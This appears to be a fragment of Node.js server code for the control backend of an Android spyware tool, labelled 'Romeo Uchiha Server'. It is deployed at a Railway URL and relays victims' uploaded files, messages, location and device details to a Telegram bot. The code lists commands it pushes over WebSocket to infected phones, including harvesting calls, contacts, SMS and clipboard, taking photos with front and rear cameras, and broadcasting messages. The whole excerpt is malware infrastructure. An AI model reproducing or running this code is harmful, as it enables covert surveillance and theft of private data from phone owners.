...
const webhookURL = 'https://isc-production.up.railway.app'; // Tumhari Railway URL

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});

// Polling ki jagah Webhook use kiya gaya hai
const appBot = new telegramBot(token);
appBot.setWebHook(`${webhookURL}/bot${token}`);
...
app.post("/uploadFile", upload.single('file'), (req, res) => {
    ...
    appBot.sendDocument(id, req.file.buffer, {
        ...
        }).catch(e => console.log("File Upload Error:", e.message));
    res.send('');
});

app.post("/uploadText", (req, res) => {
    const modelName = req.headers.model || 'Unknown Device';
    const textData = req.body['text'] || 'Empty Message';
    appBot.sendMessage(id, ROMEO_HEADER + `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${modelName}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + textData, {parse_mode: "HTML"}).catch(e => console.log(e.message));
    res.send('');
});
...
app.post("/uploadLocation", (req, res) => {
    ...
    if(req.body['lat'] && req.body['lon']) {
        appBot.sendLocation(id, req.body['lat'], req.body['lon']).catch(e => console.log(e.message));
    }
    appBot.sendMessage(id, ROMEO_HEADER + `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${modelName}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, {parse_mode: "HTML"}).catch(e => console.log(e.message));
    res.send('');
});
...
appBot.on("callback_query", (callbackQuery) => {
    ...
    if (commend == 'device') {
        const clientDevice = appClients.get(data.split(':')[1]);
        const deviceName = clientDevice ? clientDevice.model : 'Unknown Device';

        appBot.editMessageText(ROMEO_HEADER + `°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙘𝙤𝙢𝙢𝙚𝙣𝙙 𝙛𝙤𝙧 𝙙𝙚𝙫𝙞𝙘𝙚 : <b>${deviceName}</b>`, {
            chat_id: id,
    ...
    const simpleCommands = ['calls', 'contacts', 'messages', 'apps', 'device_info', 'clipboard', 'camera_main', 'camera_selfie', 'location', 'vibrate', 'stop_audio'];
    
    if (simpleCommands.includes(commend)) {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send(commend);
            }
    ...
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id).catch(e=>console.log(e));
        appBot.sendMessage(id, ROMEO_HEADER +
...
appServer.listen(process.env.PORT || 8999, () => {
    console.log("Romeo Uchiha Server is running with Webhook!");
});
